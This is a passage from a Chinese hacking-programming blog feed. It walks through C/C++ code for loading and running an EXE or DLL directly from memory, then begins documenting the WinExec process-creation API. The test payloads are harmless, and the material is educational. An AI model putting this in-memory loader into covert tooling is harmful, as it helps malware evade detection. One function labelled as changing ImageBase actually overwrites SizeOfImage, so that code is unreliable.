GENERIC_READ | GENERIC_WRITE,<br>FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING,<br>FILE_ATTRIBUTE_ARCHIVE, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取大小</span><br>DWORD dwFileSize = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//申请内存空间</span><br>PBYTE pData = <span class="hljs-keyword">new</span> BYTE[dwFileSize];<br>DWORD dwRet = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//将文件读取到内存中</span><br><span class="hljs-built_in">ReadFile</span>(hFile, pData, dwFileSize, &amp;dwRet, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br></code></pre></div></td></tr></table></figure><h5 id="获取sizeofimage"><a href="#获取sizeofimage" class="headerlink" title="获取sizeofimage"></a>获取sizeofimage</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*获取PE文件的镜像大小，获取加载到内存后的大小</span><br><span class="hljs-comment">* lpData内存中的基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetImageSize</span><span class="hljs-params">(LPVOID lpData)</span> </span>&#123;<br>DWORD dwSizeOfImage = <span class="hljs-number">0</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage;<br><span class="hljs-keyword">return</span> dwSizeOfImage;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">LPVOID lpBaseAddr = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">RtlZeroMemory</span>(lpBaseAddr, dwImageSize);<br></code></pre></div></td></tr></table></figure><h5 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*将PE文件的头部和节区加载到内存中</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">LoadSection</span><span class="hljs-params">(LPVOID lpData, LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取DOS头+NT头+节表的总大小</span><br>DWORD dwSizeOfHeaders = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders;<br><span class="hljs-comment">//获取节的数量</span><br><span class="hljs-keyword">int</span> NumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections;<br><span class="hljs-comment">//获取第一个节表头的地址，通过NT头加上NT头大小就是第一个节头</span><br>PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="hljs-keyword">sizeof</span>(IMAGE_NT_HEADERS));<br><span class="hljs-comment">//加载DOS头+NT头+节表</span><br>RtlCopyMemory(lpBaseAddr, lpData, dwSizeOfHeaders);<br>LPVOID lpSrc = <span class="hljs-literal">NULL</span>;<br>LPVOID lpDest = <span class="hljs-literal">NULL</span>;<br>DWORD dwSizeOfRawData = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NumberOfSections; i++) &#123;<br><span class="hljs-keyword">if</span> ((pSectionHeader-&gt;VirtualAddress == <span class="hljs-number">0</span>) || (pSectionHeader-&gt;SizeOfRawData == <span class="hljs-number">0</span>)) &#123;<br>pSectionHeader++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>lpSrc = (LPVOID)((DWORD)lpData + pSectionHeader-&gt;PointerToRawData);<br>lpDest = (LPVOID)((DWORD)lpBaseAddr + pSectionHeader-&gt;VirtualAddress);<br>dwSizeOfRawData = pSectionHeader-&gt;SizeOfRawData;<br>RtlCopyMemory(lpDest, lpSrc, dwSizeOfRawData);<br>pSectionHeader++;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="重定位数据"><a href="#重定位数据" class="headerlink" title="重定位数据"></a>重定位数据</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*获取重定位表的相关数据并且重定位数据</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoRelocationTable</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取重定位表</span><br>PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br><span class="hljs-keyword">if</span> ((PVOID)pReloc == (PVOID)pDosHeader) &#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">//开始扫描重定位表</span><br><span class="hljs-keyword">while</span> ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始</span><br>WORD* pRelocData = (WORD*)((PBYTE)pReloc + <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION));<br><span class="hljs-comment">//获取需要重定位的数据的个数</span><br><span class="hljs-keyword">int</span> nNumberOfReloc = (pReloc-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-keyword">sizeof</span>(WORD);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nNumberOfReloc; i++) &#123;<br>            <span class="hljs-comment">//高位是否为3，判断是否需要修复</span><br><span class="hljs-keyword">if</span> ((DWORD)(pRelocData[i] &amp; <span class="hljs-number">0x0000F000</span>) == <span class="hljs-number">0x00003000</span>) &#123; <br><span class="hljs-comment">//获取需要重定位数据的地址</span><br>DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; <span class="hljs-number">0x0FFF</span>));<br><span class="hljs-comment">//修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值</span><br>DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase;<br>*pAddress += dwDelta;<br>&#125;<br>&#125;<br><span class="hljs-comment">//继续处理下一组重定位数据</span><br>pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock);<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*获取导入表的相关数据</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoImportTable</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取导入表地址</span><br>PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);<br><span class="hljs-comment">// 循环遍历导入表中的DLL及获取导入表中的函数地址</span><br><span class="hljs-keyword">char</span>* lpDllName = <span class="hljs-literal">NULL</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportNameArray = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="hljs-literal">NULL</span>;<br>FARPROC lpFuncAddress = <span class="hljs-literal">NULL</span>;<br>DWORD i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pImportTable-&gt;OriginalFirstThunk) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 获取导入表中DLL的名称并加载DLL</span><br>lpDllName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + pImportTable-&gt;Name);<br>hDll = <span class="hljs-built_in">GetModuleHandleA</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll) &#123;<br>hDll = <span class="hljs-built_in">LoadLibraryA</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll) &#123;<br>pImportTable++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span><br>lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk);<br><span class="hljs-comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span><br>lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk);<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == lpImportNameArray[i].u1.AddressOfData) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 获取IMAGE_IMPORT_BY_NAME结构</span><br>lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData);<br><span class="hljs-comment">// 判断导出函数是序号导出还是函数名称导出</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal) &#123;<br><span class="hljs-comment">// 序号导出</span><br><span class="hljs-comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span><br>lpFuncAddress = <span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="hljs-number">0x0000FFFF</span>));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 名称导出</span><br>lpFuncAddress = <span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)lpImportByName-&gt;Name);<br>&#125;<br>lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress;<br>i++;<br>&#125;<br>pImportTable++;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="修改ImageBase"><a href="#修改ImageBase" class="headerlink" title="修改ImageBase"></a>修改ImageBase</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//修改ImageBase</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetImage</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h5><p>如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">Entry</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br>__asm &#123;<br>mov eax,Entry<br>jmp eax<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1ackie!!!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行程序查看效果，可以看到直接加载运行TestProcess.exe。</p><p><img src="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/1.png"></p><p>若是DLL文件，还需要构造一下DLLMAIN</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CallDllMain</span><span class="hljs-params">(LPVOID lpBaseAddr)</span> </span>&#123;<br>typedef_DllMain DllMain = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br>BOOL bRet = <span class="hljs-built_in">DllMain</span>((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (bRet == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;构造入口点失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*获取导出函数及其地址</span><br><span class="hljs-comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">* lpszFuncName：导出函数名字</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">LPVOID <span class="hljs-title">GetExFuncAddr</span><span class="hljs-params">(LPVOID lpBaseAddr,<span class="hljs-keyword">char</span>* lpszFuncName)</span> </span>&#123;<br>LPVOID lpFunc = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br><span class="hljs-comment">//获取导出表地址</span><br>PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + <br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><span class="hljs-comment">//从导出表取出的函数名</span><br><span class="hljs-keyword">char</span>* lpFuncName = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取AddressOfNames</span><br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames);<br><span class="hljs-comment">//获取AddressOfNameOrdinals</span><br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals);<br><span class="hljs-comment">//索引值</span><br>WORD wHint = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//获取AddressOfFunctions</span><br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions);<br><span class="hljs-comment">//获取所有根据名称导出的函数数量</span><br>DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwNumberOfNames; i++) &#123;<br>lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (strcmpi(lpFuncName, lpszFuncName) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//获取索引值</span><br>wHint = lpAddressOfNameOrdinalArray[i];<br><span class="hljs-comment">//根据索引值，在AddressOfFunctions中取出RVA</span><br>lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//返回函数地址</span><br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。</p><p><img src="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>启动技术</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启动技术-创建进程API</title>
    <link href="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/"/>
    <url>/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/</url>
    
    <content type="html"><![CDATA[<h4 id="创建进程API"><a href="#创建进程API" class="headerlink" title="创建进程API"></a>创建进程API</h4><p>在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。</p><h4 id="具体实现及函数介绍"><a href="#具体实现及函数介绍" class="headerlink" title="具体实现及函数介绍"></a>具体实现及函数介绍</h4><h5 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h5><p>运行指定的应用程序</p><figure class="highlight objectivec"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs objectivec"><span class="hljs-built_in">UINT</span> WinExec(<br>  LPCSTR lpCmdLine,<br>  <span class="hljs-built_in">UINT</span>   uCmdShow<br>);<br></code></pre></div></td></tr></table></figure><p>lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件：</p><ol><li>应用程序加载的目录</li><li>当前目录</li><li>Windows系统目录。GetSystemDirectory函数检索此目录的路径。</li><li>Windows目录。GetWindowsDirectory函数检索此目录的路径。</li><li>PATH环节变量中列出的目录</li></ol><p>uCmdShow：显示选项，具体内容如下表：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE<BR>0</BR></td><td>隐藏窗口并激活另一个窗口</td></tr><tr><td>SW_SHOWNORMAL<BR>SW_NORMAL<BR>1</BR></BR></td><td>激活并显示一个窗口</td></tr><tr><td>SW_SHOWMINIMIZED<BR>2</BR></td><td>激活窗口并将其显示为最小化的窗口</td></tr><tr><td>SW_SHOWMAXIMIZED<br>SW_MAXIMIZE<br>3</td><td>激活窗口并将其显示为最大化窗口</td></tr><tr><td>SW_SHOWNOACTIVATE<br>4</td><td>以最近的大小和位置显示窗口</td></tr><tr><td>SW_SHOW<br>5</td><td>激活窗口并以其当前大小和位置显示它</td></tr><tr><td>SW_MINIMIZE<br>6</td><td>最小化指定的窗口并激活Z顺序中的下一个顶级窗口</td></tr><tr><td>SW_SHOWMINNOACTIVE<br>7</td><td>将窗口显示为最小化窗口</td></tr><tr><td>SW_SHOWNA<br>8</td><td>以当前大小和位置显示窗口</td></tr><tr><td>SW_RESTORE<br>9</td><td>激活并显示窗口</td></tr><tr><td>SW_SHOWDEFAULT<br>10</td><td>根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。</td></tr><tr><td>SW_FORCEMINIMIZE<br>11</td><td>最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。</td></tr></tbody></table><p>返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>系统内存或资源不足</td></tr><tr><td>ERROR_BAD_FORMAT</td><td>exe文件无效</td></tr><tr><td>ERROR_FILE_NOT_FOUND</td><td>找不到指定文件</td></tr><tr><td>ERROR_PATH_NOT_FOUND</td><td>找不到指定的路径</td></tr></tbody></table><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Open</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szPath, UINT uiCmdshow)</span></span><br><span class="hljs-function"></span>&#123;<br>UINT uiRet = <span class="hljs-number">0</span>;<br>uiRet = WinExec(szPath, uiCmdshow);<br><span class="hljs-keyword">if</span> (uiRet &gt; <span class="hljs-number">31</span>)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> 